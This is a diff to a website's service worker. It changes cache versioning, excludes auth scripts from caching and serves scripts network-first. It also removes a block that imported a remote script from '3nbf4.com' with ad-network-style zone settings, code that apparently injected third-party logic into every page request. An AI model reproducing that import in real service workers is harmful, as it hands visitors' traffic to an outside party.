@@ -1,5 +1,5 @@
 /* GlitchRealm Service Worker - Advanced Optimizations */
-const CACHE_PREFIX = 'gr-v7'; // Incremented - Supabase image fix
+const CACHE_PREFIX = 'gr-v9'; // v9: Fixed caching — scripts now network-first
 const STATIC_CACHE = `${CACHE_PREFIX}-static`;
 const RUNTIME_CACHE = `${CACHE_PREFIX}-runtime`;
 const IMAGE_CACHE = `${CACHE_PREFIX}-images`;
@@ -28,6 +28,10 @@ const NEVER_CACHE = [
   '/subdomains/news/firebase-core.js',
   '/js/script.js',
   '/subdomains/news/script.js',
+  '/js/portal-auth.js',
+  '/js/signin.js',
+  '/js/auth-redirect-handler.js',
+  '/auth-bridge',
   'firebase',
   'firebaseapp.com',
   'firestore.googleapis.com'
@@ -48,23 +52,6 @@ self.addEventListener('install', (event) => {
   );
   self.skipWaiting();
 });
-
-/* === Merged from sw (1).js ===
-   The following block was appended from the duplicate service-worker file
-   to preserve behavior while keeping the original `sw.js` intact.
-*/
-
-try {
-  self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 10544960
-  };
-  self.lary = "";
-  importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw');
-} catch (e) {
-  // If external import fails, do not break the primary SW logic.
-  console.warn('Merged SW import failed:', e);
-}
 
 self.addEventListener('activate', (event) => {
   event.waitUntil(
@@ -266,11 +253,18 @@ self.addEventListener('fetch', (event) => {
     event.respondWith(cacheFirst(request, IMAGE_CACHE));
     return;
   }
-  if (request.destination === 'style' || request.destination === 'script') {
+  // CSS: stale-while-revalidate (cosmetic, safe to serve cached)
+  if (request.destination === 'style') {
     event.respondWith(staleWhileRevalidate(request));
     return;
   }
 
-  // Default: SWR
-  event.respondWith(staleWhileRevalidate(request));
+  // JS: network-first so users always get fresh scripts (fixes ctrl+shift+r requirement)
+  if (request.destination === 'script') {
+    event.respondWith(networkFirst(request, RUNTIME_CACHE, 4000));
+    return;
+  }
+
+  // Default: network-first
+  event.respondWith(networkFirst(request, RUNTIME_CACHE, 4000));
 });
